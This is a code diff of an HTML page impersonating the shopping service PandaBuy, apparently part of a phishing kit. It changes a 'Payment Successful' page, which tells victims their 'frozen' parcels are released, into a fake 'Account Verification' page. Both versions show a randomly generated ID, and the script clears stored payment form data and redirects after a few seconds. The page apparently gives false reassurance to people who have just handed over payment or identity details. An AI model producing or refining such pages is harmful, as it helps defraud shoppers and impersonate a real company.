@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Successful - PandaBuy</title>
+    <title>Account Verification - PandaBuy</title>
     <link rel="icon" type="image/png" href="favicon.png">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -61,7 +61,7 @@
         }
         
         .status-badge {
-            background: linear-gradient(135deg, #28a745, #20c997);
+            background: linear-gradient(135deg, #17a2b8, #138496);
             color: white;
             padding: 8px 16px;
             border-radius: 25px;
@@ -70,7 +70,7 @@
             display: flex;
             align-items: center;
             gap: 6px;
-            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
+            box-shadow: 0 4px 15px rgba(23, 162, 184, 0.3);
         }
         
         /* Main Content */
@@ -80,8 +80,8 @@
             padding: 0 20px;
         }
         
-        /* Success Card */
-        .success-card {
+        /* Verification Card */
+        .verification-card {
             background: white;
             border-radius: 16px;
             padding: 50px 40px;
@@ -91,46 +91,45 @@
             border: 1px solid #f1f3f4;
         }
         
-        .success-icon {
+        .verification-icon {
             width: 100px;
             height: 100px;
-            background: linear-gradient(135deg, #28a745, #20c997);
+            background: linear-gradient(135deg, #17a2b8, #138496);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 25px;
-            animation: successBounce 1.5s ease-out;
-            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.3);
+            animation: verificationPulse 2s ease-in-out infinite;
+            box-shadow: 0 8px 25px rgba(23, 162, 184, 0.3);
         }
         
-        @keyframes successBounce {
-            0% { transform: scale(0); opacity: 0; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-            100% { transform: scale(1); opacity: 1; }
+        @keyframes verificationPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 8px 25px rgba(23, 162, 184, 0.3); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 35px rgba(23, 162, 184, 0.4); }
         }
         
-        .success-icon i {
+        .verification-icon i {
             color: white;
             font-size: 40px;
         }
         
-        .success-title {
+        .verification-title {
             font-size: 32px;
-            color: #28a745;
+            color: #17a2b8;
             margin-bottom: 15px;
             font-weight: 700;
         }
         
-        .success-subtitle {
+        .verification-subtitle {
             font-size: 18px;
             color: #6c757d;
             margin-bottom: 30px;
             line-height: 1.5;
         }
         
-        /* Transaction Details */
-        .transaction-details {
+        /* Verification Details */
+        .verification-details {
             background: #f8f9fa;
             border-radius: 12px;
             padding: 25px;
@@ -160,8 +159,8 @@
             color: #2c3e50;
         }
         
-        .status-confirmed {
-            color: #28a745;
+        .status-verifying {
+            color: #17a2b8;
             font-weight: 700;
         }
         
@@ -289,8 +288,18 @@
             background: linear-gradient(135deg, #28a745, #20c997);
         }
         
+        .timeline-icon.processing {
+            background: linear-gradient(135deg, #17a2b8, #138496);
+            animation: spin 2s linear infinite;
+        }
+        
         .timeline-icon.pending {
             background: linear-gradient(135deg, #ffc107, #e0a800);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .timeline-content h4 {
@@ -313,11 +322,11 @@
         
         /* Responsive */
         @media (max-width: 768px) {
-            .success-card {
+            .verification-card {
                 padding: 30px 20px;
             }
             
-            .success-title {
+            .verification-title {
                 font-size: 24px;
             }
             
@@ -346,45 +355,45 @@
                 <div class="logo-text">PandaBuy</div>
             </div>
             <div class="status-badge">
-                <i class="fas fa-check-circle"></i>
-                Payment Verified
+                <i class="fas fa-user-check"></i>
+                Verifying Account
             </div>
         </div>
     </div>
 
     <!-- Main Content -->
     <div class="main-content">
-        <!-- Success Card -->
-        <div class="success-card">
-            <div class="success-icon">
-                <i class="fas fa-check"></i>
+        <!-- Verification Card -->
+        <div class="verification-card">
+            <div class="verification-icon">
+                <i class="fas fa-user-shield"></i>
             </div>
-            <h1 class="success-title">Payment Successful!</h1>
-            <p class="success-subtitle">
-                Your payment has been processed successfully. Your parcels have been unfrozen and will be shipped within 24-48 hours.
+            <h1 class="verification-title">Account Verification</h1>
+            <p class="verification-subtitle">
+                We're currently verifying your account details to ensure the security of your parcels. This process helps us confirm your identity and protect your shipments.
             </p>
             
-            <!-- Transaction Details -->
-            <div class="transaction-details">
+            <!-- Verification Details -->
+            <div class="verification-details">
                 <div class="detail-row">
-                    <span class="detail-label">Transaction ID</span>
-                    <span class="detail-value">PB-2024-<span id="transactionId"></span></span>
+                    <span class="detail-label">Verification ID</span>
+                    <span class="detail-value">VF-2024-<span id="verificationId"></span></span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">Payment Method</span>
-                    <span class="detail-value">Credit Card (****)</span>
+                    <span class="detail-label">Account Status</span>
+                    <span class="detail-value">Registered User</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Verification Status</span>
+                    <span class="detail-value status-verifying">In Progress</span>
                 </div>
                 <div class="detail-row">
                     <span class="detail-label">Processing Time</span>
-                    <span class="detail-value">24-48 hours</span>
+                    <span class="detail-value">5-10 minutes</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">Status</span>
-                    <span class="detail-value status-confirmed">Confirmed & Verified</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Confirmation Email</span>
-                    <span class="detail-value">Sent to registered email</span>
+                    <span class="detail-label">Notification</span>
+                    <span class="detail-value">Email will be sent upon completion</span>
                 </div>
             </div>
         </div>
@@ -392,57 +401,57 @@
         <!-- Info Cards -->
         <div class="info-grid">
             <div class="info-card">
-                <h3><i class="fas fa-shipping-fast"></i> Shipping Update</h3>
-                <p>Your parcels are now unfrozen and will be processed for shipping. You'll receive tracking information via email once shipped.</p>
+                <h3><i class="fas fa-shield-alt"></i> Security Check</h3>
+                <p>We're performing security checks to verify your identity and ensure your account meets our safety standards for international shipping.</p>
             </div>
             <div class="info-card">
-                <h3><i class="fas fa-envelope"></i> Email Confirmation</h3>
-                <p>A detailed confirmation email has been sent to your registered email address with all transaction details.</p>
+                <h3><i class="fas fa-clock"></i> Processing Time</h3>
+                <p>Account verification typically takes 5-10 minutes. You'll receive an email notification once the process is complete.</p>
             </div>
         </div>
 
         <!-- Timeline -->
         <div class="timeline">
-            <h3><i class="fas fa-clock"></i> Processing Timeline</h3>
+            <h3><i class="fas fa-tasks"></i> Verification Process</h3>
             <div class="timeline-item">
                 <div class="timeline-icon completed">
                     <i class="fas fa-check"></i>
                 </div>
                 <div class="timeline-content">
-                    <h4>Payment Verified</h4>
-                    <p>Your payment has been successfully processed and verified</p>
+                    <h4>Information Submitted</h4>
+                    <p>Your account information has been successfully submitted</p>
                 </div>
-                <div class="timeline-time">Just now</div>
+                <div class="timeline-time">Completed</div>
             </div>
             <div class="timeline-item">
-                <div class="timeline-icon completed">
+                <div class="timeline-icon processing">
+                    <i class="fas fa-cog"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4>Identity Verification</h4>
+                    <p>We're currently verifying your identity and account details</p>
+                </div>
+                <div class="timeline-time">In Progress</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-icon pending">
+                    <i class="fas fa-envelope"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4>Email Confirmation</h4>
+                    <p>You'll receive a confirmation email once verification is complete</p>
+                </div>
+                <div class="timeline-time">Pending</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-icon pending">
                     <i class="fas fa-unlock"></i>
                 </div>
                 <div class="timeline-content">
-                    <h4>Parcels Unfrozen</h4>
-                    <p>All frozen parcels have been released for processing</p>
+                    <h4>Account Activated</h4>
+                    <p>Your account will be fully activated and parcels will be processed</p>
                 </div>
-                <div class="timeline-time">Just now</div>
-            </div>
-            <div class="timeline-item">
-                <div class="timeline-icon pending">
-                    <i class="fas fa-box"></i>
-                </div>
-                <div class="timeline-content">
-                    <h4>Preparing for Shipment</h4>
-                    <p>Your parcels are being prepared and packaged for shipping</p>
-                </div>
-                <div class="timeline-time">Next 24-48 hours</div>
-            </div>
-            <div class="timeline-item">
-                <div class="timeline-icon pending">
-                    <i class="fas fa-truck"></i>
-                </div>
-                <div class="timeline-content">
-                    <h4>Shipped</h4>
-                    <p>Tracking information will be provided once shipped</p>
-                </div>
-                <div class="timeline-time">Within 48 hours</div>
+                <div class="timeline-time">Pending</div>
             </div>
         </div>
 
@@ -452,21 +461,21 @@
                 <i class="fas fa-home"></i>
                 Return to Dashboard
             </a>
-            <a href="#" class="btn btn-secondary" onclick="window.print()">
-                <i class="fas fa-print"></i>
-                Print Receipt
+            <a href="#" class="btn btn-secondary" onclick="window.location.reload()">
+                <i class="fas fa-sync-alt"></i>
+                Check Status
             </a>
         </div>
     </div>
 
     <script>
-        // Generate random transaction ID
-        document.getElementById('transactionId').textContent = Math.random().toString(36).substr(2, 9).toUpperCase();
+        // Generate random verification ID
+        document.getElementById('verificationId').textContent = Math.random().toString(36).substr(2, 9).toUpperCase();
         
-        // Auto redirect after 15 seconds
+        // Auto redirect after 12 seconds
         setTimeout(() => {
             window.location.href = '/';
-        }, 15000);
+        }, 12000);
         
         // Clear any stored form data
         localStorage.removeItem('paymentFormData');
